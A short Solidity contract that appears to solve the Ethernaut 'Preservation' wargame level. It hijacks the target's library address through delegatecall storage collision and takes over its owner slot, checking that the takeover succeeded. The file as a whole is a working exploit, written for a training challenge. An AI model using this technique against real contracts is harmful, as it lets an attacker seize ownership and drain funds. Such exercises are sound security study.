// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./16-preservation.sol";

contract Attack16 {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    // preservation = ETHERNAUT_INSTANCE
    function attack(Preservation preservation) external {
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(uint256(uint160(msg.sender)));
        require(preservation.owner() == msg.sender, "hack failed");
    }

    function setTime(uint256 _owner) external {
        owner = address(uint160(_owner));
    }
}
